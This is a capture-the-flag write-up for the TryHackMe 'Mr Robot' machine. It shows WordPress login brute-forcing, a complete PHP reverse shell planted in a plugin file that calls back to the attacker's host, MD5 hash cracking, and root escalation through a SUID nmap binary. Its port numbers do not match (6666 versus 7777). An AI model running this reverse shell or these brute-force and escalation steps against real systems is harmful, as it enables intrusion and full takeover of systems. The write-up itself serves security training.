# Mr Robot - THM
###  Difficulty level: Medium
------------------------------------------------------


I'll start by running nmap scan:
```bash
nmap -sV -sC 10.10.244.187 -oN scan.nmap
```
![image](https://user-images.githubusercontent.com/114166939/228566080-59482bc5-6d2e-441b-97f4-5eeb07c2da39.png)

Let's strart with port 80 - the website:

![image](https://user-images.githubusercontent.com/114166939/228566740-1b1d449a-890b-4bed-b7ef-856e1537661f.png)

I'll run gobuster tool to find hidden directories:
```bash
gobuster dir -u http://10.10.244.187/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
```

The results:

![image](https://user-images.githubusercontent.com/114166939/228568077-7d79d93e-581a-4995-8dd0-2b7b48a227ce.png)

Let's take a look on the robots directory on the url "http://10.10.244.187/robots.txt":

![image](https://user-images.githubusercontent.com/114166939/228568609-587c8bab-7e8a-421f-87d7-6eec8fb3d2b7.png)

The first one download a word-list file with many words which related to the series.

![image](https://user-images.githubusercontent.com/114166939/228569677-80548c4c-02a9-4f1f-81a0-ca3a98a80f3a.png)

The second file is the first key to this challenge:

![image](https://user-images.githubusercontent.com/114166939/228570023-7ef747ea-a3dd-4c07-b01b-1bea32d38a0d.png)

Next, there is a directory called "wp-login" which means that this website built with WordPress.
I'll go over this directory and try to see how the page will react with wrong credentials:

![image](https://user-images.githubusercontent.com/114166939/228571802-3911254d-038d-4aa2-b28a-4013ed53ef05.png)

Definitely, this user does not exist and I get "Invalid username" error, so maybe if I'll try a valid username, it will print "wrong password" error or another error message.

I'll try to brute-force it with burp-suite intruder.

I'll exploit only the username with sniper attack.

![image](https://user-images.githubusercontent.com/114166939/228576771-42d617ce-6ef0-4fe5-b8d5-91f60fc55f17.png)

For word-list I'll use the "fsocity.dic" file which I found in the robots.txt directory:

![image](https://user-images.githubusercontent.com/114166939/228576952-9745cae1-ac99-4120-92df-2e3a65ec6643.png)

Start attack!

![image](https://user-images.githubusercontent.com/114166939/228577916-64866e2a-ca0f-4022-b0d8-48fe6c6fce0d.png)

The length of all packets are 4069 except one packet which is 4120. This packet is the username "Elliot".

When I'm trying to log in with these username, I'm getting a different error message, so I can conclude it is a valid user name.

![image](https://user-images.githubusercontent.com/114166939/228579461-318ec399-9cc7-41be-9906-63641f37d33a.png)

Now, I'll try to brute-force this login page again with "fsocity.dic" word-list but brute force only the password of "Elliot" user.

![image](https://user-images.githubusercontent.com/114166939/228581127-e1892208-3a02-457b-99ef-6fa44232fadf.png)

Start attack!

![image](https://user-images.githubusercontent.com/114166939/228583178-de04239f-2b85-40dc-8f67-1d8755994c3c.png)

The length of all packets are 4120 except one packet which is 1077. This packet is the password of the user "Elliot",
I will conclude the password is "ER28-0652".

I'll log-in with the credentials I found:

![image](https://user-images.githubusercontent.com/114166939/228583963-df63ea47-fb35-4b6f-8f7d-a2a8193eb4dc.png)

Let's try to edit a plugin:

![image](https://user-images.githubusercontent.com/114166939/228584166-f2b68ef8-dbc3-4c49-995f-4f7d7f513584.png)

I'll select "WPtouch Mobile Plugin" and "wptouch/core/admin-render.php".
There is an "update file" option on this plugin and it's written in php:

![image](https://user-images.githubusercontent.com/114166939/228585503-2f5ce6ec-796c-4912-9168-c67c57a39246.png)

I can delete it all and put a php reverse shell code instead!
I'll use Pentestmonkey's reverse shell:

```php
  <?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '[MY-IP]';  // You have to change this
  $port = 6666;  // And this
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = 'uname -a; w; id; /bin/sh -i';
  $daemon = 0;
  $debug = 0;

  //
  // Daemonise ourself if possible to avoid zombies later
  //

  // pcntl_fork is hardly ever available, but will allow us to daemonise
  // our php process and avoid zombies.  Worth a try...
  if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
      printit("ERROR: Can't fork");
      exit(1);
    }
    
    if ($pid) {
      exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
      printit("Error: Can't setsid()");
      exit(1);
    }

    $daemon = 1;
  } else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
  }

  // Change to a safe directory
  chdir("/");

  // Remove any umask we inherited
  umask(0);

  //
  // Do the reverse shell...
  //

  // Open reverse connection
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
  }

  // Spawn shell process
  $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("pipe", "w")   // stderr is a pipe that the child will write to
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
  }

  // Set everything to non-blocking
  // Reason: Occsionally reads will block, even though stream_select tells us they won't
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  printit("Successfully opened reverse shell to $ip:$port");

  while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
      printit("ERROR: Shell connection terminated");
      break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
      printit("ERROR: Shell process terminated");
      break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process's STDIN
    if (in_array($sock, $read_a)) {
      if ($debug) printit("SOCK READ");
      $input = fread($sock, $chunk_size);
      if ($debug) printit("SOCK: $input");
      fwrite($pipes[0], $input);
    }

    // If we can read from the process's STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
      if ($debug) printit("STDOUT READ");
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit("STDOUT: $input");
      fwrite($sock, $input);
    }

    // If we can read from the process's STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
      if ($debug) printit("STDERR READ");
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit("STDERR: $input");
      fwrite($sock, $input);
    }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

  // Like print, but does nothing if we've daemonised ourself
  // (I can't figure out how to redirect STDOUT like a proper daemon)
  function printit ($string) {
    if (!$daemon) {
      print "$string
";
    }
  }

  ?> 
```

Chnaged the IP and the port, paste it as a plugin and clicked "update file".
Now, all left to do is open net-cat listener on port 6666:
```bash
nc -lnvp 7777
```
And get to the url of this plugin so it'll run.
url: "http://10.10.244.187/wp-content/plugins/wptouch/core/admin-render.php"

Got a reverse shell!

![image](https://user-images.githubusercontent.com/114166939/228589671-c0e74779-633f-4ade-8ac4-5600fd9ffb52.png)

The only user on the machine is "robot", on it's home directory there are 2 files:

![image](https://user-images.githubusercontent.com/114166939/228590538-c02b7d45-2b59-4108-bddd-16073b870492.png)

I have permissions to read the "password.raw-md5"
![image](https://user-images.githubusercontent.com/114166939/228590859-40e78f10-4bbc-4ff0-a7c2-88d5c8330483.png)

This is the robot's user credentials!
The password is md5 hash, I'll use "https://hashes.com/en/decrypt/hash" rainbow tables to find out what is the password:

![image](https://user-images.githubusercontent.com/114166939/228591705-87a63708-9732-4a8a-a428-cb2ef12026b9.png)

Now, I need to switch to the robot user, I can't do it with sh shell so I'll change it to bash shell using python:
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

![image](https://user-images.githubusercontent.com/114166939/228592496-23a1addc-831b-4c1f-ae8a-54dcfae0976b.png)

Now I can cat "key-2-of-3.txt" file and get the second key!

![image](https://user-images.githubusercontent.com/114166939/228593012-0f93c32a-74c3-4dc5-9006-916952d04c2c.png)

To get a privilege escalation I'll search for SUID files using the command:
```bash
find / -user root -perm /4000 2>/dev/null
```
![image](https://user-images.githubusercontent.com/114166939/228594055-d773f8f7-a97a-4737-b9ad-a091fb3d98db.png)

The "/usr/local/bin/nmap" looks suspicious so I'll search in "https://gtfobins.github.io/" if I can get a privilege
escalation from this binary:

![image](https://user-images.githubusercontent.com/114166939/228594926-7e4074ff-2728-4091-b17b-e24fbd573519.png)

There is a Sudo option which redirect to the following bash commands:

![image](https://user-images.githubusercontent.com/114166939/228595416-d9c7616f-de6a-45ec-a1d2-a1e607909e81.png)

Before I'll try it on the machine I need to change it because "robot" user does'nt have 
sudo premissions to this file I'll use the commands:
```bash
/usr/local/bin/nmap --interactive
!sh
```

![image](https://user-images.githubusercontent.com/114166939/228596646-1ca11d83-2fd3-42c6-8d2e-fae6f09f634d.png)

Now easily I can open the root home directory and cat the third key!

![image](https://user-images.githubusercontent.com/114166939/228597161-387d3f73-24fd-4369-aca4-2188831231c9.png)
